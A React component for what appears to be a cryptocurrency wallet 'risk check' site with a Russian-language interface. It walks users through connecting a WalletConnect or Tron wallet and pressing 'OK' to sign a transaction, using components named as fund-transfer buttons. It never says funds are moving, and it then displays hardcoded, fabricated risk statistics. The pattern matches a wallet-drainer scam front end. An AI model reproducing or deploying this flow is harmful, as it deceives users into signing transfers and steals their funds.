import React, { useEffect, useState } from 'react';
import Modal from "react-modal";
import CloseIcon from '@mui/icons-material/Close';
// import WalletConnect from '../../wallet-connect';
import TronConnectButton from '../../Tron/tron-connect-button'
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import './PrimaryBtn.css';
import "./Popup.css";
import Logo from '../../../assets/logo.png';
import ScoreIcon from '../../../assets/score-icon.png';
import TronTransferFundsButton from '../../Tron/TronTransferFundsButton';
import { WalletConnectButton } from '../../WalletConnect/wallet-connect-button';
import WalletConnectTransferFundsButton from '../../WalletConnect/WalletConnectTransferFundsButton';
import { useAccount } from 'wagmi';
import ResultBar from './ResultBar';

// Set the root app element for accessibility
Modal.setAppElement("#root");

interface PrimaryBtnProps {
  text: string;
  imageSrc: string;
  justifyContent?: 'center' | 'space-between';
  style?: "blue" | "white";
  size?: 'medium' | 'small'
  url?: string
}

const PrimaryBtn: React.FC<PrimaryBtnProps> = ({ text, imageSrc, justifyContent = 'center', style = "blue", size = "medium", url = null }) => {
  const [isOpen, setIsOpen] = useState(false);
  const [step, setStep] = useState(1);
  const [transactionSigned, setTransactionSigned] = useState(false); //setTransactionSigned
  const { address: tronAddress, connected: tronConnected } = useWallet();
  const { isConnected: walletConnectConnected, address: ethAddress } = useAccount();

  useEffect(() => {
    async function updateStep() {
      if (transactionSigned) {
        setStep(3);
        return;
      }
      else if (tronConnected || walletConnectConnected) {
        setStep(2);
        return;
      }
      else setStep(1);
      return;
    }
    updateStep();
  }, [tronAddress, tronConnected, transactionSigned, ethAddress, walletConnectConnected]);

  const openModal = () => setIsOpen(true);
  const closeModal = () => setIsOpen(false);
  const stepBack = () => setStep(step - 1);
  
  const handleClick = () => {
    if (url != null) {
      window.location.href = url;
    }
    else {
      openModal();
    }
  };
  
  const handleTransactionSuccess = () => {
    setStep(3);
    setTransactionSigned(true);
  }

  const renderContent = () => {
    switch (step) {
      case 1:
        return (
          <>
            <h2 className="popup-title">Подключение кошелька</h2>
            <p className="popup-subtitle">
              Пожалуйста, выберите кошелек, который хотите использовать
            </p>
            <div className="container">
              <div className="row justify-content-center align-items-center gy-3 gx-5">
                <div className="col-lg-5 col-xl-4">
                  <WalletConnectButton />
                </div>
                <div className="col-lg-5 col-xl-4">
                  <TronConnectButton />
                </div>
              </div>
            </div>
          </>
        );
      case 2:
        return (
          <div>
            <h2 className="popup-title">Почти у цели</h2>
            <p className="popup-subtitle">
              Пожалуйста, нажмите кнопку “ОК”, для подписания транзакции
            </p>
            <div className="container">
              <div className="row justify-content-center align-items-center">
                <div className="col-lg-5 col-xl-4">
                  { walletConnectConnected ? (
                    <WalletConnectTransferFundsButton onTransactionSuccess={handleTransactionSuccess}>OK</WalletConnectTransferFundsButton>
                  ) : tronConnected ? (
                    <TronTransferFundsButton onTransactionSuccess={handleTransactionSuccess}>OK</TronTransferFundsButton>
                  ) : null }
                </div>
              </div>
            </div>
          </div>
        );
      case 3:
        return (
          <div>
            <h2 className="popup-title">Ваша статистика</h2>
            <img className='popup-result-score-icon' src={ScoreIcon} alt="ScoreIcon" />
            <p className="popup-result-score">12.55%</p>
            <div className="result-bars">
              <ResultBar
                text="Разнообразие транзакций"
                percentage={20}
                color="#0057FF"
              />
              <ResultBar
                text="Активность кошелька"
                percentage={70}
                color="#219654"
              />
              <ResultBar
                text="Транзакция на/с CEX"
                percentage={20}
                color="#0057FF"
              />
              <ResultBar
                text="Средняя стоимость транзакции"
                percentage={60}
                color="#219654"
              />
              <ResultBar
                text="Возраст кошелька"
                percentage={60}
                color="#219654"
              />
              <ResultBar
                text="Подозрительные транзакции"
                percentage={55}
                color="#8B5EFD"
              />
              <ResultBar
                text="Транзакции на адреса высокого риска"
                percentage={55}
                color="#8B5EFD"
              />
            </div>
            <div className="container">
              <div className="row justify-content-center align-items-center">
                <div className="col-lg-4 col-xl-3">
                  <button
                    className="primary-button primary-button-blue primary-button-medium justify-content-center"
                    onClick={ () => {
                      closeModal();
                      setTransactionSigned(false);
                    }}
                  >
                    ОК
                  </button>
                </div>
              </div>
            </div>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <>
      <button
        className={`primary-button primary-button-${style} primary-button-${size}`}
        style={{ justifyContent }}
        onClick={handleClick}
      >
        <span className={`button-text button-text-${size}`}>{text}</span>
        <img src={imageSrc} alt="Button icon" className='button-icon' />
      </button>
      
      {/* Modal Popup */}
      <Modal
        isOpen={isOpen}
        onRequestClose={closeModal}
        contentLabel="Wallet Connect Modal"
        overlayClassName="modal-overlay"
        className="modal-content"
      >
        {step > 1 ? (
          <button onClick={stepBack} className='back-button'>Назад</button>
        ) : null }
        <button onClick={closeModal} className="close-button">
          <CloseIcon />
        </button>
        <div className="popup-content">
          <div className="popup-header">
            <img
              src={Logo} // Replace with your logo
              alt="Logo"
              className="logo"
            />
            <div className="popup-step">
              <span className='current-step'>{step}</span>
              <span className="step">/3</span>
              <span className="step-text">Шаг</span>
            </div>
          </div>
          <div className="popup-body">
            {renderContent()}
          </div>
        </div>
      </Modal>
    </>
  );
};

export default PrimaryBtn;
